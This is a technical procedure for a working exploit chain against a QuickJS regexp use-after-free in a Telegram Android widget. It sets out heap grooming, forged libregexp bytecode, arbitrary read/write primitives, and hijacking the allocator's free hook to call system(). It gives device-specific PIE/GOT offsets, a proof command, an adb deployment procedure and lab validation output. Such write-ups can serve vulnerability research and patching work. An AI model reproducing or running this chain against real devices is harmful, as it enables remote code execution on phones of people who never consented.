# PR #1827 arena payload — device procedure

Payload: `telegramandroidwidget/lab/regexp1827_arena/device_payload.js`
Lab twin: `telegramandroidwidget/lab/regexp1827_arena/lab_validate_dual.js`
(identical except the `CFG` constants and the command).

Status: lab-validated 6/6 with the lab twin (exit 0, `HOOKED` → `AFTER`,
proof file written). **Device results (2026-11-02, Sony Android 13): the UAF
and fake-bytecode execution are confirmed, but the full chain is blocked by
the fragmented class-80 arena; see `notes/regexp1827_device_results.md`.** The
original 11,623-byte reclaim is glibc-specific; the working device path uses a
454-byte (class 480, arena) bytecode. The device-constant file still fails
gracefully (`NO_CTX`) on the lab build.

---

## 1. Geometry used (and two corrections to the previous plan)

```
capture_count=4, register_count=1  -> alloc_count=9 -> 72 B -> arena class 80
```

Class-80 blocks after the capture (capture reuses the block freed by `tmp`):

| block | object | purpose |
|---|---|---|
| b0 | `tmp = {}` (freed) | capture array |
| b1 | `sv = 'A'.repeat(47)` | class-80 JSString; `len` forged for the forward OOB window |
| b2/b3 | arraybuffer JSObject / `Uint8Array` JSObject | **order varies**; dual count writes cover both |
| b4 | `v1 = [1,2,3,4,5]` | class-80 JSObject; values class-88 |
| b5 | `v2 = [0,0,0,0,0]` | class-80 JSObject; values class-88 |

**Correction 1 — the arraybuffer JSObject comes first.** In v0.17.0
`new Uint8Array(80)` allocates, in order: the `JSArrayBuffer` *JSObject*
(class 80), the `JSArrayBuffer` struct (class 56), the data buffer
(class 88), the typed-array *JSObject* (class 80), the `JSTypedArray`
struct (class 56). So if `tmp` is at b0, the blocks are b1=sv, b2=abuf,
b3=ta. `pc0=10` would hit b1 (the string), not `ta`. The payload writes the
count at **both** b2+64 (`pc0=20`) and b3+64 (`pc0=30`); exactly one lands on
`u.array.count`. The other lands in the arraybuffer JSObject's union padding
(`+64` is unused for `JS_CLASS_ARRAY_BUFFER`) — harmless.

**Correction 2 — `sv` must sit between the capture and `ta`.** The forged
class-80 string is the forward OOB window used to leak `ta`'s data pointer,
`JSTypedArray*`, and the array shape/prop/values pointers. If `ta` is placed
immediately after `tmp`, `sv` is behind it and cannot read those fields. The
payload therefore allocates `tmp, sv, ta, v1, v2` in that order.

For the class-88 slab: `ta.data` is block s, `v1.values` s+1, `v2.values`
s+2 (88-byte stride); the payload uses the leaked addresses, so only
`off = addr - taData` matters.

## 2. Fake libregexp bytecode

```
offset  8: REOP_save_start 0
offset 10: REOP_save_end   0
offset 12: REOP_set_i32  2  ff ff ff 7f    -> b1+0   (sv.len = 0x7fffffff)
offset 18: REOP_set_i32 20  ff ff ff 7f    -> b2+64  (count candidate)
offset 24: REOP_set_i32 30  ff ff ff 7f    -> b3+64  (count candidate)
offset 30: REOP_match
```

Header: `flags=0, capture_count=4, register_count=1`, bytecode payload
reclaims the freed bytecode buffer with `new Uint8Array(11623)`.

`save_end` must use group **0** (group 1 writes `capture[3]` and makes
`JS_RegExpDelete` compute start/end from a NULL capture; that crashes in
`string_buffer_write8`).

## 3. Anchor (indexing, not `.length`)

```
var probe = ta[80];
ta[80] = 0x41;
anchor = (ta[80] === 0x41);
if (anchor) ta[80] = (probe === undefined ? 0 : probe);
```

* normal count 80 → index 80 is out of bounds, the store is ignored, the read
  is `undefined` → `NO_ANCHOR`;
* corrupted count → the store/read hit `data+80` (the next class-88 block
  header, or the tail of the same block if it is the last block; always inside
  the 4 KB slab) → `anchor = 1`. The original byte is restored.

Index 80 was chosen over 100 because `data+100` can leave the 4 KB slab when
the data buffer is the last class-88 block; `data+80` cannot.

`ta.length` is **not** used: the length property lives in `prop[0]`, so it
stays 80 even when `u.array.count` is corrupted.

## 4. Chain (same as `t12_clean.js`)

1. forged `sv.len` → scan class-80 blocks after `sv` for the `Uint8Array`
   JSObject (`class_id 24` at `+18`), then the two fast arrays
   (`class_id 2`) → leak `typedptr`, `taData`, `shape`, `prop`, `v1vals`,
   `v2vals`, `Math.sin`;
2. fake `INDIRECT` string at `v2.values` (`kind=2`, data pointer at `+24`) →
   arbitrary byte read: `Math.sin+48 → JSContext*`, `+16 → JSRuntime*`,
   `rt+16 → mf.js_free`, `rt+64 → malloc_state.opaque`;
3. fake `Uint8Array` at `v2.values` (`class_id 24`, real `JSTypedArray*` at
   `+48`, arbitrary `u.ptr` at `+56`, huge `count` at `+64`) → arbitrary byte
   write;
4. `pieBase = js_free - CFG.JS_DEF_FREE` (page-aligned check),
   `free = *(pieBase + CFG.FREE_GOT)`, `system = free + CFG.SYSTEM_DELTA`;
5. write the command into `ta`'s data (61 bytes + NUL, fits the 80-byte
   buffer), then `rt+16 = system`, `rt+64 = taData`;
6. `var z = new Uint8Array(4096); z = null;` → large-block free →
   `rt->mf.js_free(opaque, b)` → `system(cmd)`.

The groomed objects and the forged `f`/`w` values are pinned in
`globalThis.R1827_KEEP/F/W`; otherwise the IIFE teardown frees the forged
`v1[2]` object and crashes *after* the chain.

## 5. Device constants (in `CFG`)

```
JS_DEF_FREE:  0x1739aec
FREE_GOT:     0x1960430
SYSTEM_DELTA: 0x26df0          (system - free)
CMD:          id > /data/user/0/org.telegram.messenger.beta/cache/rce_proof
FILL:         512       (class-80 defrag filler objects; tunable)
```

`FILL` exists because the phone's class-80 free list may be fragmented; the
filler objects consume scattered free blocks so the final fresh slab provides
sequential blocks for `tmp, sv, ta, v1, v2`. With a sequential free list the
only remaining geometric risk is `tmp` landing in the last 5 blocks of a slab
(~8%), which shows up as `NO_ANCHOR`/`NO_WINDOW`; retry with a different
`FILL` (e.g. 0, 50, 128, 256, 512) to shift the phase. In the lab every one
of those values passed 4/4.

`JS_DEF_FREE` is the PIE offset of `js_def_free`; `free@GOT` is the offset of
the resolved `free` GOT slot; `SYSTEM_DELTA` is signed (positive here, negative
on the glibc lab build). The payload checks `pieBase % 0x1000 == 0` and that
all leaked pointers are nonzero, 8-aligned and `< 2^48`.

## 6. Markers

`globalThis.RESULT` and `console.log('R1827:' + marker)` (guarded; also
`print` if present).

| marker | meaning / next action |
|---|---|
| `EXC_REPLACE` | `String.replace` threw — the fake bytecode did not execute or the fake program is malformed; check the 11,623-byte reclaim |
| `NO_ANCHOR` | neither `b2+64` nor `b3+64` is a live typed-array count; check the class-80 groom, capture class (must be 80), and `pc0` geometry |
| `NO_WINDOW` | the class-80 string/slab scan failed: `sv` not at b1, `ta`/arrays not found, or `NDEBUG` layout mismatch (debug `JSString` is 40 B) |
| `NO_CTX` | leaks worked but `ctx/rt/js_free` failed validation, or `pieBase` not page-aligned → device `JS_DEF_FREE` or `FREE_GOT` wrong; or 52-bit VA (>2^48) |
| `NO_FAKE` | the forged `Uint8Array` object was not recognized (shape/prop/class/flags or `u.typed_array` invalid) |
| `NO_CFG` | command string longer than 72 bytes |
| `HOOKED` | `rt+16`/`rt+64` written; trigger follows |
| `AFTER` | the large free returned; the command should have run |

Success on the device is the proof file
`/data/user/0/org.telegram.messenger.beta/cache/rce_proof` containing the
output of `id` (uid=...). The app may crash after `AFTER` because the
allocator hook is destructive; the file is written at the first large free,
before any later teardown.

## 7. Procedure

1. Push/execute `device_payload.js` in the widget's quickjs context, one
   synchronous eval, 6 MiB limit (the payload needs ~130 KB).
2. Capture `globalThis.RESULT` and/or the `R1827:` console lines. Expect
   `HOOKED` then `AFTER`.
3. Read the proof file:
   `adb shell run-as org.telegram.messenger.beta cat cache/rce_proof`
   (or `su -c cat`).
4. If a marker other than `AFTER` appears, use the table above; the payload
   has already validated the fake-bytecode execution by the time it reaches
   `NO_ANCHOR`/`NO_WINDOW`.

## 8. Lab validation

`lab_validate_dual.js` uses the same code with lab constants
(`js_def_free=0x14060`, `free@GOT=0x119fb0` for the archived build,
`system-free=-0x4ff30` on the host glibc, command to
`/tmp/opencode/regexp_arena/rce_proof_dual`).

```
6/6 runs of the final payload (FILL=512): exit 0, markers HOOKED, AFTER,
proof written, `mem_used=196632` (6 MiB limit).
$ cat rce_proof_dual
uid=1000(user) gid=1000(user) groups=...
```

`device_payload.js` run against the lab build intentionally stops at
`NO_CTX` (the device constants do not match the lab PIE) and performs no
writes.

## 9. Known assumptions

* Release layout: `JSString` 24 B (`ENABLE_DUMPS` off, i.e. `NDEBUG`),
  `JSValue` 16 B, `JSObject` 72 B. A debug build shifts the class-80 string
  range and the fake-string data offset.
* Stock v0.17.0 arena (≤512 B, 4 KB slabs) and default
  `JSMallocFunctions` (`js_def_*` wrappers around bionic malloc/free).
* The 11,623-byte bytecode reclaim succeeded (the fake program executes —
  proven by reaching the anchor stage).
* `rt+16 = mf.js_free`, `rt+64 = malloc_state.opaque`.
